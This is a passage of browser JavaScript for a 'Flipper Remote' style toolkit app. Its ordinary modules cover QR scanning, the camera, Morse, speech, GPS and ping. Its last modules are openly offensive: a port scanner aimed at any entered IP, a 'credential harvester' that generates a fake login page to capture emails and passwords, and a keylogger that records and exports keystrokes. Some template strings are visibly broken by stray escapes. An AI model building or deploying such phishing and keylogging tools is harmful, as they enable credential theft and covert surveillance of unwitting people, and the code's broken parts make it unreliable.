          window._qrLast=codes[0].rawValue;
          const el=$('qrR');if(el)el.textContent='> '+window._qrLast.slice(0,80);
          const st=$('qrSt');if(st)st.textContent='FMT: '+codes[0].format.toUpperCase();
          T('QR FOUND!');vib([60,20,60]);lp('G',400);
        }
      }catch(e){}
    },500);
  }catch(e){T('CAM: '+e.message.slice(0,16))}
}
function qrStop(){
  if(window._qrInt){clearInterval(window._qrInt);window._qrInt=null}
  if(window._qrStream){window._qrStream.getTracks().forEach(t=>t.stop());window._qrStream=null}
}

/* ================================================
   18. CAMERA
================================================ */
function appCam(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">CAMERA</div>
    <div class="hr"></div>
    <video id="cV" style="width:100%;border-radius:3px;display:none" autoplay playsinline muted></video>
    <canvas id="cC" style="width:100%;border-radius:3px;display:none"></canvas>
    <div class="sl d" id="cSt">> Press FRONT or BACK</div>
  </div>`;
  clearCtx();
  btn('FRONT',()=>camStart('user'),'cg');
  btn('BACK',()=>camStart('environment'),'co');
  btn('PHOTO',camPhoto,'cy');
  btn('TORCH',camTorch,'');
  btn('STOP',camOff,'cr');
  _H={ok:camPhoto};
}
let _cStream=null,_cTrack=null;
async function camStart(f){
  camOff();
  try{
    _cStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:{ideal:640}},audio:false});
    const v=$('cV');if(!v)return;
    v.srcObject=_cStream;v.style.display='block';
    _cTrack=_cStream.getVideoTracks()[0];
    const s=$('cSt');if(s)s.textContent='LIVE: '+f.toUpperCase();
    window._camStream=_cStream;
  }catch(e){T('CAM: '+e.message.slice(0,16))}
}
function camPhoto(){
  if(!_cStream){T('START CAMERA FIRST');return}
  const v=$('cV'),c=$('cC');if(!v||!c)return;
  c.width=v.videoWidth||320;c.height=v.videoHeight||240;
  c.getContext('2d').drawImage(v,0,0);
  c.style.display='block';v.style.display='none';
  c.toBlob(b=>{
    const a=document.createElement('a');
    a.href=URL.createObjectURL(b);a.download='photo_'+Date.now()+'.jpg';a.click();
    T('PHOTO SAVED!');vib([30,10,30]);
  },'image/jpeg',.92);
}
async function camTorch(){
  if(!_cTrack){T('START BACK CAM');return}
  const caps=_cTrack.getCapabilities();
  if(!caps.torch){T('NO TORCH');return}
  const cur=_cTrack.getSettings().torch||false;
  await _cTrack.applyConstraints({advanced:[{torch:!cur}]});
  T('TORCH: '+((!cur)?'ON':'OFF'));
}
function camOff(){
  if(_cStream){_cStream.getTracks().forEach(t=>t.stop());_cStream=null;_cTrack=null;window._camStream=null}
}

/* ================================================
   19. MORSE VIBRO
================================================ */
function appMorse(){
  const MC={'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.'};
  let _mt='SOS';
  const render=()=>{
    const coded=_mt.toUpperCase().split('').map(c=>MC[c]||'').join(' ');
    scr.innerHTML=`<div class="fi">
      <div class="sl h">MORSE VIBRO</div>
      <div class="hr"></div>
      <div class="sl" style="text-align:center">${_mt}</div>
      <div class="morse-txt">${coded}</div>
    </div>`;
  };
  render();clearCtx();
  btn('PLAY',async()=>{
    const coded=_mt.toUpperCase().split('').map(c=>MC[c]).filter(Boolean).join(' _ ').split('');
    let pos=0;
    const next=async()=>{
      if(pos>=coded.length)return;
      const c=coded[pos++];
      if(c==='.')vib(80);
      else if(c==='-')vib(250);
      else if(c==='_'){await new Promise(r=>setTimeout(r,200));next();return}
      else{await new Promise(r=>setTimeout(r,100));next();return}
      lp('O',c==='.'?80:250);
      await new Promise(r=>setTimeout(r,c==='.'?200:400));
      next();
    };
    next();T('PLAYING...');
  },'cg');
  btn('INPUT',()=>{const t=prompt('Text to encode:');if(t){_mt=t;render()}},'co');
  btn('DECODE',()=>{
    const m=prompt('Morse (. - and spaces):');
    if(!m)return;
    const rev=Object.fromEntries(Object.entries(MC).map(([k,v])=>[v,k]));
    T('DECODED: '+m.split(' ').map(w=>rev[w]||'?').join(''));
  },'cy');
  _H={ok:()=>document.querySelector('.cb.cg')?.click()};
}

/* ================================================
   20. SPEECH TO TEXT
================================================ */
function appSpeech(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">SPEECH TO TEXT</div>
    <div class="hr"></div>
    <div class="sl d" id="spSt">READY</div>
    <div class="hr"></div>
    <div id="spTxt" style="white-space:normal;line-height:1.5;font-size:5.5px;position:relative;z-index:2;font-family:var(--px);color:var(--fg)">---</div>
  </div>`;
  clearCtx();
  btn('LISTEN',spListen,'cg');
  btn('STOP',spStop,'');
  btn('SPEAK',spSpeak,'co');
  btn('CLEAR',()=>{const e=$('spTxt');if(e)e.textContent='---'},'');
  _H={ok:spListen};
}
let _recog=null;
function spListen(){
  const SR=window.SpeechRecognition||window.webkitSpeechRecognition;
  if(!SR){T('NOT SUPPORTED');return}
  spStop();
  _recog=new SR();
  _recog.continuous=true;_recog.interimResults=true;_recog.lang='en-US';
  _recog.onstart=()=>{const e=$('spSt');if(e)e.textContent='LISTENING...'};
  _recog.onresult=e=>{
    let f='',i2='';
    for(let j=e.resultIndex;j<e.results.length;j++){
      if(e.results[j].isFinal)f+=e.results[j][0].transcript;
      else i2+=e.results[j][0].transcript;
    }
    const el=$('spTxt');
    if(el)el.textContent=(f||i2).slice(0,120)||'---';
    if(f){addLog('Speech',f.slice(0,30));lp('G',200)}
  };
  _recog.onerror=e=>{const el=$('spSt');if(el)el.textContent='ERR: '+e.error};
  _recog.onend=()=>{const el=$('spSt');if(el)el.textContent='STOPPED'};
  _recog.start();T('LISTENING...');
}
function spStop(){if(_recog){try{_recog.stop()}catch(e){}}_recog=null}
function spSpeak(){
  if(!window.speechSynthesis){T('NO TTS');return}
  const msg=prompt('Text to speak:');
  if(!msg)return;
  window.speechSynthesis.speak(Object.assign(new SpeechSynthesisUtterance(msg),{rate:.95}));
  T('SPEAKING...');
}

/* ================================================
   21. PING / NETWORK INFO
================================================ */
function appPing(){
  let results=[];let running=false;
  const targets=[
    {n:'Google DNS',url:'https://dns.google/resolve?name=a.test&type=A'},
    {n:'Cloudflare',url:'https://1.1.1.1/dns-query?name=test.&type=A'},
    {n:'OpenDNS',url:'https://api.openresolve.com/'},
  ];
  let targetIdx=0;

  const render=()=>{
    const c=navigator.connection;
    const avg=results.length?Math.round(results.reduce((a,b)=>a+b)/results.length):0;
    const min=results.length?Math.min(...results):0;
    const max=results.length?Math.max(...results):0;
    scr.innerHTML=`<div class="fi">
      <div class="sl h">PING / NET INFO</div>
      <div class="hr"></div>
      <div class="sl d">TARGET: ${targets[targetIdx].n}</div>
      <div class="sl d">TYPE: ${c?.effectiveType||'?'} / ${c?.downlink||'?'} Mbps</div>
      <div class="sl d">RTT: ~${c?.rtt||'?'}ms</div>
      <div class="hr"></div>
      ${results.length?`
        <div class="sl h" style="text-align:center">${results[results.length-1]}ms</div>
        <div class="sl d">MIN:${min}ms  AVG:${avg}ms  MAX:${max}ms</div>
        <div class="pw"><div class="pf" style="width:${Math.min(100,results[results.length-1]/5)}%"></div></div>
        <div class="sl d" style="margin-top:2px">PINGS: ${results.length}</div>
      `:'<div class="sl d">> Press PING to test latency</div>'}
      ${running?'<div class="sl d"><span class="bl">[PINGING...]</span></div>':''}
    </div>`;
  };

  render();clearCtx();

  btn('PING',async()=>{
    if(running)return;running=true;render();
    const t0=performance.now();
    try{await fetch(targets[targetIdx].url,{mode:'no-cors',cache:'no-store'})}catch(e){}
    const ms=Math.round(performance.now()-t0);
    results.push(ms);if(results.length>20)results.shift();
    lp('G',150);vib(10);T('PING: '+ms+'ms');
    running=false;render();
  },'cg');

  btn('LOOP',async()=>{
    if(running)return;running=true;
    for(let i=0;i<5;i++){
      if(!running)break;
      const t0=performance.now();
      try{await fetch(targets[targetIdx].url,{mode:'no-cors',cache:'no-store'})}catch(e){}
      const ms=Math.round(performance.now()-t0);
      results.push(ms);if(results.length>20)results.shift();
      lp('G',80);render();
      await new Promise(r=>setTimeout(r,600));
    }
    running=false;render();T('LOOP DONE');
  },'co');

  btn('MY IP',async()=>{
    T('GETTING IP...');startLoad(2500);
    const localIp=await getLocalIP();
    T(localIp?'LOCAL: '+localIp:'COULD NOT DETECT');
  },'cy');

  btn('< TGT',()=>{targetIdx=(targetIdx-1+targets.length)%targets.length;render()},'');
  btn('TGT >',()=>{targetIdx=(targetIdx+1)%targets.length;render()},'');
  btn('CLEAR',()=>{results=[];render()},'');
  _H={ok:()=>document.querySelector('.cb.cg')?.click(),lt:()=>{targetIdx=(targetIdx-1+targets.length)%targets.length;render()},rt:()=>{targetIdx=(targetIdx+1)%targets.length;render()}};
}

/* ================================================
   22. GPS TRACKER
================================================ */
function appGPS(){
  rGPS();clearCtx();
  btn('START',gpsStart,'cg');
  btn('STOP',()=>{if(S.gpsWatch){navigator.geolocation.clearWatch(S.gpsWatch);S.gpsWatch=null}rGPS()},'');
  btn('MAPS',()=>{if(S.gpsPos)window.open(`https://maps.google.com/?q=${S.gpsPos.lat},${S.gpsPos.lon}`,'_blank');else T('NO GPS')},'co');
  btn('SHARE',()=>{
    if(!S.gpsPos){T('NO GPS');return}
    const u=`https://maps.google.com/?q=${S.gpsPos.lat.toFixed(6)},${S.gpsPos.lon.toFixed(6)}`;
    navigator.share?.({title:'My Location',url:u}).catch(()=>navigator.clipboard?.writeText(u).then(()=>T('LINK COPIED!')));
  },'cy');
  _H={ok:gpsStart};
}
function rGPS(){
  const d=S.gpsPos;
  scr.innerHTML=`<div class="fi">
    <div class="sl">${S.gpsWatch!==null?'<span class="bl">[TRACKING]</span>':'[IDLE]'}</div>
    <div class="sl d">PTS: ${S.gpsTrack.length}</div>
    <div class="hr"></div>
    ${d?`<div class="sl h">LAT: ${d.lat.toFixed(6)}</div>
      <div class="sl h">LON: ${d.lon.toFixed(6)}</div>
      <div class="sl">ACC: +/-${Math.round(d.acc)}m</div>
      <div class="sl d">SPD: ${d.spd!=null?(d.spd*3.6).toFixed(1)+' km/h':'N/A'}</div>`
    :'<div class="sl d">> Press START</div>'}
  </div>`;
}
function gpsStart(){
  if(!navigator.geolocation){T('NO GPS');return}
  if(S.gpsWatch)return;
  T('ACQUIRING...');startLoad(10000);
  S.gpsWatch=navigator.geolocation.watchPosition(pos=>{
    S.gpsPos={lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,spd:pos.coords.speed};
    S.gpsTrack.push({...S.gpsPos,t:Date.now()});
    if(S.gpsTrack.length>1000)S.gpsTrack.shift();
    lp('G',150);
    if(S.app==='gps')rGPS();
  },err=>{T('GPS: '+err.message.slice(0,16));S.gpsWatch=null;rGPS()},{enableHighAccuracy:true,maximumAge:0,timeout:30000});
}

/* ================================================
   23. HACKER MODE
================================================ */
function appHack(){
  const lines=[
    {t:'p',s:'> FLIPPER REMOTE v5.1 BOOT...'},
    {t:'ok',s:'[OK] CC1101 RF chip online'},
    {t:'ok',s:'[OK] NRF52840 BLE active'},
    {t:'ok',s:'[OK] ST25R NFC reader OK'},
    {t:'p', s:'> Scanning 2.4GHz band...'},
    {t:'ok',s:'[OK] 14 WiFi networks found'},
    {t:'ok',s:'[OK] 9 BLE devices in range'},
    {t:'p', s:'> Checking IR field...'},
    {t:'ok',s:'[OK] IR carrier 38kHz detected'},
    {t:'p', s:'> Sub-GHz @ 433.92MHz...'},
    {t:'ok',s:'[OK] OOK signal: RSSI -42dBm'},
    {t:'p', s:'> NFC scan...'},
    {t:'ok',s:'[OK] ISO 14443-A 07h detected'},
    {t:'p', s:'> GPS constellation...'},
    {t:'ok',s:'[OK] Fix: 11 sats HDOP 0.9'},
    {t:'ok',s:'> ALL SYSTEMS GO [FR]'},
  ];
  let li=0;
  scr.innerHTML=`<div style="padding:2px;height:100%;overflow:hidden"><div class="term" id="hackOut"></div></div>`;
  clearCtx();
  btn('RUN',()=>{
    const el=$('hackOut');if(!el)return;
    el.textContent='';li=0;startLoad(lines.length*110);
    clearInterval(window._hackInt);
    window._hackInt=setInterval(()=>{
      if(li>=lines.length){clearInterval(window._hackInt);return}
      const l=lines[li++];
      const cls=l.t==='p'?'p':l.t==='ok'?'ok':'er';
      el.innerHTML+=`<div class="${cls}">${l.s}</div>`;
      vib(4);el.parentElement.scrollTop=9999;
    },110);
  },'cg');
  btn('LIVE',()=>{
    const el=$('hackOut');if(!el)return;
    clearInterval(window._hackInt);
    const pool=[
      ()=>`> BLE: ${FAKE_BT[rand(0,FAKE_BT.length-1)]} RSSI:-${rand(30,90)}dBm`,
      ()=>`> WiFi: ${FAKE_WIFI[rand(0,FAKE_WIFI.length-1)]} CH${rand(1,11)}`,
      ()=>`> RF: ${SUBF[rand(0,3)]}MHz OOK RSSI:-${rand(25,75)}dBm`,
      ()=>`> NFC: scan... ${Math.random()>.7?'tag found!':'no tag'}`,
      ()=>`> IR: ${Math.random()>.5?'carrier detected':'idle'}`,
    ];
    window._hackInt=setInterval(()=>{
      const line=pool[rand(0,pool.length-1)]();
      el.innerHTML+=`<div class="ok">${line}</div>`;
      if(el.children.length>20)el.children[0].remove();
      el.parentElement.scrollTop=9999;
      if(Math.random()>.7)lp('O',80);
      if(Math.random()>.85)vib(5);
    },500);
    T('LIVE FEED ON');
  },'cp');
  btn('CLEAR',()=>{const el=$('hackOut');if(el)el.innerHTML='';clearInterval(window._hackInt)},'');
  _H={ok:()=>document.querySelector('.cb.cg')?.click()};
}

/* ================================================
   24. WAKE LOCK
================================================ */
function appWake(){
  rWake();clearCtx();
  btn('LOCK ON',wakeOn,'cg');
  btn('LOCK OFF',wakeOff,'cr');
}
function rWake(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">WAKE LOCK</div>
    <div class="sl">${S.wakeLock?'<span class="bl">[ACTIVE]</span>':'[INACTIVE]'}</div>
    <div class="hr"></div>
    <div class="sl d">Keeps screen awake.</div>
    <div class="sl d">Good for TV remote use.</div>
    <div class="hr"></div>
    <div class="sl ${'wakeLock' in navigator?'h':'r'}">${'wakeLock' in navigator?'[OK] SUPPORTED':'[!] NOT SUPPORTED'}</div>
  </div>`;
}
async function wakeOn(){
  if(!('wakeLock' in navigator)){T('NOT SUPPORTED');return}
  try{
    S.wakeLock=await navigator.wakeLock.request('screen');
    S.wakeLock.addEventListener('release',()=>{S.wakeLock=null;if(S.app==='wakelock')rWake()});
    T('WAKE LOCK ON!');lp('G',500);rWake();
  }catch(e){T('WAKE: '+e.message.slice(0,14))}
}
async function wakeOff(){
  if(S.wakeLock){await S.wakeLock.release();S.wakeLock=null}
  T('WAKE LOCK OFF');rWake();
}

/* ================================================
   25. SYSTEM
================================================ */
function appSystem(){
  clearCtx();
  btn('REFRESH',rSys,'cg');
  btn('LOG',appLog,'co');
  btn('INSTALL',()=>{
    if(window._pwaP){window._pwaP.prompt()}
    else showModal(`<div style="color:var(--fl);font-size:7px;margin-bottom:8px">INSTALL APP</div><div>iOS: Share > Add to Home Screen<br><br>Android: Menu > Add to Home Screen</div><button class="cb cg" onclick="closeModal()" style="margin-top:8px;max-width:none;flex:none;padding:6px 12px">OK</button>`);
  },'cy');
  rSys();_H={ok:rSys};
}
function rSys(){
  scr.innerHTML=`<div class="fi sl2">
    <pre style="
      font-family:var(--mo);
      font-size:clamp(3.5px,0.95vw,4.8px);
      line-height:1.35;color:var(--fl);
      text-shadow:0 0 6px rgba(255,107,0,.25);
      text-align:center;margin:0 0 3px;
      white-space:pre;position:relative;z-index:2;
    ">      .-----..------.
     / FLIPPER \\ ZERO \\
    |  REMOTE   v5.1  |
     \\_________________/
    [BT] [NFC] [RF] [IR]</pre>
    <div class="sl h" style="text-align:center;font-size:5px">FLIPPER REMOTE v5.1</div>
    <div class="hr"></div>
    <div class="sl d">APPS: ${MENU.length}   LOG: ${S.log.length}</div>
    <div class="sl d">BAT: ${S.battery?Math.round(S.battery.level*100)+'%'+(S.battery.charging?' CHG':''):'N/A'}</div>
    <div class="hr"></div>
    <div class="sl d">BT:${'bluetooth' in navigator?'Y':'N'}  NFC:${'NDEFReader' in window?'Y':'N'}  SER:${'serial' in navigator?'Y':'N'}</div>
    <div class="sl d">QR:${'BarcodeDetector' in window?'Y':'N'}  GPS:${!!navigator.geolocation?'Y':'N'}</div>
  </div>`;
}

/* ══════════════════════════════════
   37. PORT SCANNER
══════════════════════════════════ */
function appPortScanner(){
  let target = '';
  let scanning = false;
  let results = [];
  
  const render = () => {
    scr.innerHTML = `<div class="fi">
      <div class="sl h">🔍 PORT SCANNER</div>
      <div class="hr"></div>
      <div class="sl d">TARGET: \${target || 'Not set'}</div>
      <div class="sl d ${scanning ? 'bl' : ''}">${scanning ? '⚡ SCANNING...' : '○ READY'}</div>
      <div class="hr"></div>
      \${results.filter(r => r.open).map(p => 
        `<div class="sl d" style="color:var(--fl)">PORT ${p.port} OPEN - ${p.service}</div>`
      ).join('') || '<div class="sl d">No open ports found</div>'}
    </div>`;
  };
  
  render();clearCtx();
  
  btn('SET TARGET', () => {
    target = prompt('Enter target IP:');
    if(target) render();
  }, 'cg');
  
  btn('SCAN', async () => {
    if(!target) { T('SET TARGET FIRST'); return; }
    scanning = true;
    results = [];
    render();
    
    const commonPorts = [
      { port: 21, service: 'FTP' },
      { port: 22, service: 'SSH' },
      { port: 23, service: 'Telnet' },
      { port: 25, service: 'SMTP' },
      { port: 53, service: 'DNS' },
      { port: 80, service: 'HTTP' },
      { port: 110, service: 'POP3' },
      { port: 443, service: 'HTTPS' },
      { port: 3389, service: 'RDP' },
      { port: 5432, service: 'PostgreSQL' },
      { port: 3306, service: 'MySQL' },
      { port: 8080, service: 'HTTP-Alt' }
    ];
    
    for(const p of commonPorts) {
      try {
        const start = performance.now();
        await fetch(`http://${target}:${p.port}`, { mode: 'no-cors' });
        const time = Math.round(performance.now() - start);
        results.push({ ...p, open: true, time });
        T(`Port ${p.port} open!`);
        vib(10);
      } catch(e) {
        results.push({ ...p, open: false });
      }
      await new Promise(r => setTimeout(r, 100));
    }
    
    scanning = false;
    T(`Scan complete! ${results.filter(r => r.open).length} ports open`);
    render();
  }, 'cr');
  
  btn('EXPORT', () => {
    const open = results.filter(r => r.open);
    const text = `Open ports for ${target}:\n${open.map(p => `${p.port} - ${p.service}`).join('\n')}`;
    navigator.clipboard.writeText(text);
    T('Results copied!');
  }, 'co');
}

/* ══════════════════════════════════
   38. CREDENTIAL HARVESTER
══════════════════════════════════ */
function appHarvester(){
  let harvesting = false;
  let credentials = [];
  let harvestUrl = '';
  
  const render = () => {
    scr.innerHTML = `<div class="fi">
      <div class="sl h">🎣 CRED HARVESTER</div>
      <div class="hr"></div>
      <div class="sl d">HARVESTED: \${credentials.length}</div>
      <div class="sl ${harvesting ? 'bl' : ''}">${harvesting ? '⚡ ACTIVE' : '○ IDLE'}</div>
      <div class="hr"></div>
      \${credentials.slice(-3).reverse().map(c => 
        `<div class="sl d">${c.email} - ${c.password}</div>`
      ).join('') || '<div class="sl d">No credentials yet</div>'}
    </div>`;
  };
  
  render();clearCtx();
  
  btn('CREATE PAGE', () => {
    const fakeLogin = `
      <html><body style="font-family:Arial;padding:50px;background:#f0f0f0">
        <div style="max-width:400px;margin:auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
          <h2 style="text-align:center">Login Required</h2>
          <form onsubmit="localStorage.setItem('creds', JSON.stringify({email:this.email.value,password:this.pass.value}));window.location.href='https://google.com'">
            <input type="email" name="email" placeholder="Email" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px">
            <input type="password" name="pass" placeholder="Password" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px">
            <button type="submit" style="width:100%;padding:12px;background:#4285f4;color:white;border:none;border-radius:5px;cursor:pointer">Login</button>
          </form>
        </div>
      </body></html>
    `;
    
    const blob = new Blob([fakeLogin], { type: 'text/html' });
    harvestUrl = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = harvestUrl;
    a.download = 'login.html';
    a.click();
    T('Fake login page created!');
  }, 'cg');
  
  btn('START HARVEST', () => {
    harvesting = true;
    const checkCreds = setInterval(() => {
      const creds = localStorage.getItem('creds');
      if(creds) {
        const parsed = JSON.parse(creds);
        credentials.push({ ...parsed, timestamp: Date.now() });
        localStorage.removeItem('creds');
        T(`🎣 Got: ${parsed.email}`);
        vib([40, 20, 40]);
        render();
      }
      if(!harvesting) clearInterval(checkCreds);
    }, 1000);
    render();
  }, 'cr');
  
  btn('STOP', () => {
    harvesting = false;
    T('Harvesting stopped');
    render();
  }, 'co');
  
  btn('EXPORT', () => {
    const text = credentials.map(c => `${c.email}:\${c.password}`).join('\n');
    navigator.clipboard.writeText(text);
    T('Credentials exported!');
  }, 'cy');
}

/* ══════════════════════════════════
   39. KEYLOGGER
══════════════════════════════════ */
function appKeylogger(){
  let logging = false;
  let keystrokes = [];
  
  const render = () => {
    scr.innerHTML = `<div class="fi">
      <div class="sl h">⌨️ KEYLOGGER</div>
      <div class="hr"></div>
      <div class="sl ${logging ? 'bl' : ''}">${logging ? '⚡ RECORDING' : '○ STOPPED'}</div>
      <div class="hr"></div>
      <div class="sl d">KEYSTROKES: \${keystrokes.length}</div>
      <div style="max-height:100px;overflow-y:auto;font-family:monospace;font-size:4px;color:var(--fgd)">
        \${keystrokes.slice(-50).join(' ')}
      </div>
    </div>`;
  };
  
  render();clearCtx();
  
  btn('START', () => {
    logging = true;
    keystrokes = [];
    
    const logKey = (e) => {
      if(logging) {
        keystrokes.push(e.key);
        if(keystrokes.length % 20 === 0) render();
      }
    };
    
    document.addEventListener('keydown', logKey);
    window._keyloggerHandler = logKey;
    T('Keylogger started!');
    render();
  }, 'cg');
  
  btn('STOP', () => {
    logging = false;
    if(window._keyloggerHandler) {
      document.removeEventListener('keydown', window._keyloggerHandler);
      delete window._keyloggerHandler;
    }
    T('Keylogger stopped');
    render();
  }, 'cr');
  
  btn('CLEAR', () => {
    keystrokes = [];
    render();
  }, 'co');
  
  btn('EXPORT', () => {
    const text = keystrokes.join('');
    navigator.clipboard.writeText(text);
    T('Keystrokes copied!');
  }, 'cy');
}

/* LOG */
function appLog(){
  let off=0;
  const r=()=>{
    scr.innerHTML=`<div class="fi sl2">
      <div class="sl d">${S.log.length} ENTRIES</div>
      <div class="hr"></div>
      ${S.log.slice(off,off+8).map(e=>`<div style="display:flex;gap:2px;line-height:1.55;position:relative;z-index:2">
        <span style="font-family:var(--mo);font-size:5px;color:var(--fgd);flex-shrink:0">${e.ts}</span>
        <span style="font-family:var(--px);font-size:5px;color:var(--fgh);flex-shrink:0">[${e.cat}]</span>
        <span style="font-family:var(--px);font-size:5px;overflow:hidden">${e.msg}</span>
      </div>`).join('')||'<div class="sl d">Empty</div>'}
    </div>`;
  };
  r();clearCtx();
  btn('TOP',()=>{off=0;r()},'');
  btn('COPY',()=>navigator.clipboard?.writeText(S.log.map(l=>l.ts+' ['+l.cat+'] '+l.msg).join('\n')).then(()=>T('COPIED!')),'cy');
  btn('CLEAR',()=>{S.log=[];off=0;r();T('CLEARED')},'cr');
  _H={up:()=>{off=Math.max(0,off-1);r()},dn:()=>{off=Math.min(Math.max(0,S.log.length-8),off+1);r()}};
}

/* PWA */
window.addEventListener('beforeinstallprompt',e=>{e.preventDefault();window._pwaP=e});
window.closeModal=closeModal;
window.openApp=openApp;
window.S=S;
window.rBT=rBT;
window.T=T;
